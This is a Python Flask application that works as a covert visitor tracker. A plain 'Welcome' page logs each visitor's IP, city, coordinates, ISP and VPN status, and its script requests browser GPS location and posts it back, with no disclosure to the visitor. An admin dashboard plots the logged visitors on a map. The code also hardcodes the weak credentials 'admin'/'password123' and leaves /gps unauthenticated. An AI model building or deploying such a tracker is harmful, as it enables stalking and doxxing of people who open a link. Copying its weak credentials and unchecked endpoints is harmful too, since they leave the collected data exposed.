from flask import Flask, request, render_template_string, jsonify, abort, redirect, session
from datetime import datetime
import geoip2.database
import ipaddress
import requests
import json
import os

app = Flask(__name__)
app.secret_key = "CHANGE_THIS_SECRET_KEY"

# -------------------- CONFIG --------------------
VPN_API_KEY = "YOUR_IPAPI_KEY"

ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "password123"   # 🔴 change this
app.secret_key = os.environ.get("SECRET_KEY", "dev-secret")

try:
    city_reader = geoip2.database.Reader("GeoLite2-City.mmdb")
    asn_reader = geoip2.database.Reader("GeoLite2-ASN.mmdb")
except Exception as e:
    city_reader = None
    asn_reader = None
    print("GeoIP disabled:", e)
LOG_FILE = "access.log"

# -------------------- HELPERS --------------------
def get_client_ip():
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        return forwarded.split(",")[0].strip()
    return request.remote_addr

def is_private(ip):
    try:
        return ipaddress.ip_address(ip).is_private
    except ValueError:
        return True

def log_event(data):
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")

def admin_required():
    if not session.get("admin"):
        return False
    return True

# -------------------- VISITOR --------------------
@app.route("/visit")
def visit():
    ip = get_client_ip()

    log = {
        "time": str(datetime.utcnow()),
        "ip": ip,
        "country": None,
        "city": None,
        "isp": None,
        "vpn": None,
        "lat": None,
        "lon": None
    }

    if not is_private(ip):
        try:
            city_res = city_reader.city(ip)
            asn_res = asn_reader.asn(ip)

            log["country"] = city_res.country.name
            log["city"] = city_res.city.name
            log["lat"] = city_res.location.latitude
            log["lon"] = city_res.location.longitude
            log["isp"] = asn_res.autonomous_system_organization
        except:
            pass

        try:
            r = requests.get(
                f"https://api.ipapi.is/?q={ip}&key={VPN_API_KEY}",
                timeout=5
            )
            log["vpn"] = "Yes" if r.json().get("is_vpn") else "No"
        except:
            log["vpn"] = "Unknown"

    log_event(log)
    return render_template_string(VISITOR_PAGE)

# -------------------- GPS --------------------
@app.route("/gps", methods=["POST"])
def gps():
    data = request.json
    log_event({
        "time": str(datetime.utcnow()),
        "gps_lat": data.get("lat"),
        "gps_lon": data.get("lon")
    })
    return jsonify({"status": "ok"})

# -------------------- LOGIN --------------------
@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    error = None
    if request.method == "POST":
        if (
            request.form["username"] == ADMIN_USERNAME
            and request.form["password"] == ADMIN_PASSWORD
        ):
            session["admin"] = True
            return redirect("/admin")
        else:
            error = "Invalid credentials"

    return render_template_string(LOGIN_PAGE, error=error)

# -------------------- ADMIN --------------------

@app.route("/admin")
def admin():
    if not admin_required():
        return redirect("/admin/login")

    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    logs.append(json.loads(line))
                except json.JSONDecodeError:
                    print("Skipping invalid log line:", line)

    return render_template_string(ADMIN_PAGE, logs=logs[::-1])



# -------------------- LOGOUT --------------------
@app.route("/admin/logout")
def logout():
    session.clear()
    return redirect("/admin/login")

# -------------------- HTML --------------------
VISITOR_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Welcome</title></head>
<body>
<h3>Welcome</h3>

<script>
navigator.geolocation.getCurrentPosition(pos => {
 fetch("/gps", {
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body:JSON.stringify({
     lat:pos.coords.latitude,
     lon:pos.coords.longitude
   })
 });
});
</script>

</body>
</html>
"""

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Admin Login</title></head>
<body>
<h2>Admin Login</h2>

{% if error %}
<p style="color:red">{{ error }}</p>
{% endif %}

<form method="post">
<input name="username" placeholder="Username" required><br><br>
<input name="password" type="password" placeholder="Password" required><br><br>
<button type="submit">Login</button>
</form>

</body>
</html>
"""

ADMIN_PAGE = """
<!DOCTYPE html>
<html>
<head>
<title>Admin Dashboard</title>
<link rel="stylesheet"
 href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
#map{height:500px}
table{border-collapse:collapse;width:100%}
td,th{border:1px solid #ccc;padding:6px}
</style>
</head>

<body>
<h2>Admin Dashboard</h2>
<a href="/admin/logout">Logout</a>
<div id="map"></div>

<table>
<tr>
<th>Time</th><th>IP</th><th>Country</th><th>City</th>
<th>ISP</th><th>VPN</th><th>Lat</th><th>Lon</th>
</tr>

{% for l in logs %}
<tr>
<td>{{ l.time }}</td>
<td>{{ l.ip }}</td>
<td>{{ l.country }}</td>
<td>{{ l.city }}</td>
<td>{{ l.isp }}</td>
<td>{{ l.vpn }}</td>
<td>{{ l.lat }}</td>
<td>{{ l.lon }}</td>
</tr>
{% endfor %}
</table>

<script>
const map = L.map('map').setView([0,0], 2);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);

{% for l in logs %}
{% if l.lat and l.lon %}
L.marker([{{ l.lat }}, {{ l.lon }}])
.addTo(map)
.bindPopup("{{ l.ip }}<br>{{ l.city }}, {{ l.country }}");
{% endif %}
{% endfor %}
</script>

</body>
</html>
"""

# -------------------- RUN --------------------
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
